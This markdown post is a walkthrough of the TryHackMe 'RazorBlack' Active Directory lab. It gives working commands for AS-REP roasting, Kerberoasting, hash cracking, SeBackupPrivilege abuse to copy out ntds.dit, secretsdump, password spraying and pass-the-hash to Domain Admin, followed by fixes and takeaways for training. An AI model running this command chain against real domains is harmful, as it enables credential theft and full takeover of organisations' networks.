@@ -1,0 +1,173 @@
+---
+title: 'RazorBlack'
+description: 'An anonymous NFS share leaks a staff list, AS-REP roasting and Kerberoasting hand over two accounts, and SeBackupPrivilege is used to dump NTDS.dit for full domain compromise.'
+date: 2025-12-02
+platform: tryhackme
+room: 'RazorBlack'
+roomUrl: 'https://tryhackme.com/room/raz0rblack'
+difficulty: medium
+tags:
+  - 'active-directory'
+  - 'kerberos'
+  - 'asrep-roasting'
+  - 'kerberoasting'
+  - 'pass-the-hash'
+  - 'smb'
+  - 'nfs'
+  - 'ntds'
+  - 'windows'
+  - 'password-cracking'
+vulnClasses:
+  - 'as-rep roasting'
+  - 'kerberoasting'
+  - 'weak credentials'
+  - 'password reuse'
+  - 'excessive backup privilege'
+  - 'authentication bypass'
+translation: done
+draft: false
+---
+
+## **TryHackMe: RazorBlack — NFS Leaks, AS-REP Roasting, and SeBackupPrivilege to Full Domain Compromise**
+
+_A walkthrough of the "RazorBlack" TryHackMe Active Directory room. An anonymous NFS share leaks a staff directory, AS-REP roasting and Kerberoasting peel off two low-privileged accounts, and SeBackupPrivilege lets us walk out with the entire NTDS.dit — ending in Domain Admin, plus a full set of "additional objectives" flags along the way._
+
+> The flags, cracked passwords, and NTLM/Kerberos hash values are redacted. RazorBlack is an authorized training room on TryHackMe; everything here was performed against a legal practice target. Values shown as `<redacted>` are real on the box but withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+An **anonymous NFS export** leaks a spreadsheet of employee names → building a username list from it and running **AS-REP roasting** cracks `twilliams`'s password → that password is reused on a **Kerberoastable** service account, `xyan1d3`, who sits in **Backup Operators** → `SeBackupPrivilege` lets us use `diskshadow` + `robocopy` to copy out `ntds.dit` and the `SYSTEM` hive → `secretsdump` recovers every domain NTLM hash, including the Administrator's → pass-the-hash over WinRM → **Domain Admin**.
+
+Anonymous NFS → staff list → AS-REP roast → password reuse → Kerberoast → SeBackupPrivilege → NTDS dump → Domain Admin.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export DOMAIN=raz0rblack.thm
+export DC=haven-dc
+```
+
+`HAVEN-DC` is the domain controller for `raz0rblack.thm`, exposing the full AD port set — Kerberos (88), LDAP (389), SMB (445), WinRM (5985), RDP (3389) — plus an exported NFS share (2049).
+
+### **The vulnerability: everything starts from an export nobody locked down**
+
+<Callout type="insight">
+
+An NFS export world-readable to "everyone" is a classic AD foothold — it rarely holds a password outright, but it very often holds _names_, and a domain's usernames are the one piece of information every later Kerberos attack needs.
+
+</Callout>
+
+```text
+showmount -e $DC
+# Export list for raz0rblack.thm: /users (everyone)
+mount $DC:/users /mnt/users
+```
+
+The share holds a flag file for one user (`sbradley`) and an `employee_status.xlsx` spreadsheet listing every staff member's full name. Converting `First Last` → `flast` builds a username list good enough to feed every subsequent attack.
+
+### **Step 1 — AS-REP roasting finds a user with no Kerberos pre-auth**
+
+```text
+impacket-GetNPUsers -no-pass $DOMAIN/ -usersfile modified_names.txt -format hashcat -outputfile hashes.txt
+# twilliams doesn't require pre-authentication -> AS-REP hash captured
+hashcat -m 18200 -a 0 hashes.txt rockyou.txt
+# twilliams -> <redacted-password>
+```
+
+### **Step 2 — password reuse unlocks a Kerberoastable service account**
+
+```text
+impacket-GetUserSPNs $DOMAIN/twilliams:'<redacted-password>' -dc-ip $DC -request -outputfile kerb.hash
+# SPN found for xyan1d3 (member of Remote Management Users)
+hashcat -m 13100 -a 0 kerb.hash rockyou.txt
+# xyan1d3 -> <redacted-password>
+```
+
+```text
+nxc winrm $DC -u xyan1d3 -p '<redacted-password>'
+# raz0rblack.thm\xyan1d3:<redacted-password> (Pwn3d!)
+```
+
+### **Step 3 — SeBackupPrivilege dumps NTDS.dit as a non-admin**
+
+`xyan1d3` belongs to **Backup Operators**, which carries `SeBackupPrivilege`/`SeRestorePrivilege` — enough to back up the entire filesystem without being a domain admin.
+
+<Callout type="insight">
+
+This is the well-documented SeBackupPrivilege abuse path (shadow-copy the volume, then just copy NTDS.dit out of the shadow mount) — no admin rights needed, only the backup-operator privilege most orgs hand out too freely.
+
+</Callout>
+
+```text
+# upload a diskshadow script, then:
+diskshadow /s diskshadow.txt      # shadow-copies C: and exposes it as E:
+robocopy /b E:\Windows\ntds . ntds.dit
+reg save HKLM\SYSTEM .\SYSTEM
+```
+
+### **Step 4 — secretsdump + pass-the-hash to Domain Admin**
+
+```text
+impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL -just-dc-ntlm
+# Administrator:500:...:<redacted-ntlm-hash>:::
+```
+
+```text
+evil-winrm -i $DC -u administrator -H <redacted-ntlm-hash>
+# whoami -> raz0rblack\administrator (Domain Admins, Enterprise Admins)
+```
+
+### **Additional objectives — chasing down every flag**
+
+The room has several side flags beyond the main path; each is its own small lesson.
+
+- **Steven's flag** sits unencrypted in the NFS share itself, found during the very first `/users` mount.
+- **Xyan1d3's flag** is hidden inside a `PSCredential` XML in the user's profile. The `UserName` field is a taunt ("Nope your flag is not here") but the encrypted `Password` field is readable with the user's own DPAPI key:
+
+```text
+$credential = Import-Clixml -Path .\xyan1d3.xml
+$credential.GetNetworkCredential().Password
+# -> <redacted-flag>
+```
+
+- **The Administrator's root flag** is in a second PSCredential XML, but it fails to import — the DPAPI blob was re-encoded as a plain hex string rather than left as the original encrypted blob. Decoding the hex (e.g. with CyberChef) recovers the plaintext message and flag directly, no DPAPI key needed.
+- **"What is the complete top secret?"** is a riddle hidden in a `top_secret.png` image found by a recursive filename search (`Get-ChildItem -Include *secret*`); the image shows a half-typed `vim` exit sequence, and the expected answer is the correct command (`:wq`).
+- **Ljudmila's flag** needs a second foothold: spraying `twilliams`'s cracked password across the whole username list over SMB turns up that `sbradley` has the _same_ password, just expired. `smbpasswd` lets us set a new one for `sbradley` without ever knowing the old one, which then gets SMB access to a `trash` share. That share holds a chat log referencing **CVE-2020-1472 (Zerologon)** and a password-protected zip containing a _second_, earlier `ntds.dit`/`SYSTEM` hive pair. Cracking the zip password with `zip2john`/`john` and running `secretsdump` again against those files recovers a much larger set of domain NTLM hashes. Spraying those hashes against `lvetrova` finds the matching one, and the same PSCredential-XML trick recovers her flag.
+- **Tyson's flag** is simply a file in `twilliams`'s home directory with a deliberately absurd name (`definitely_..._not_a_flag.exe`) that is, despite appearances, plain text.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Full domain compromise, and the chain never required an initial credential at all:
+
+- **Anonymous NFS access leaked a usable username list**, which fed every Kerberos attack that followed.
+- **Password reuse between a human account and a service account** turned a single AS-REP crack into Kerberoasting access.
+- **Over-provisioned Backup Operators membership** let a low-privileged account exfiltrate the entire Active Directory database without ever touching Domain Admin rights directly.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Lock down NFS exports** to specific hosts, never `everyone`, and don't store PII/credentials-adjacent data (staff directories) on them.
+2. **Enforce unique Kerberos pre-authentication for all accounts** and ban password reuse between human and service accounts with a password-manager/vaulting policy.
+3. **Treat Backup Operators as Tier-0.** Membership is functionally equivalent to Domain Admin given `SeBackupPrivilege`; restrict it as tightly as admin groups and monitor `diskshadow`/`vssadmin` usage.
+
+</Callout>
+
+### **Takeaways**
+
+- **A read-only file share is still a reconnaissance goldmine.** Names alone are enough to drive AS-REP roasting and Kerberoasting against an entire domain.
+- **Password reuse is the thread that ties unrelated accounts together.** One cracked human password unlocked a service account with real privilege.
+- **"Backup" privileges are root-equivalent in AD.** Any privilege that can read arbitrary files, including the domain database, should be treated as a Tier-0 credential.
+
+Thanks for reading. RazorBlack strings together nearly every classic AD misconfiguration in one box, and it's worth replaying each step slowly — the side-objective flags teach as much as the main path does.
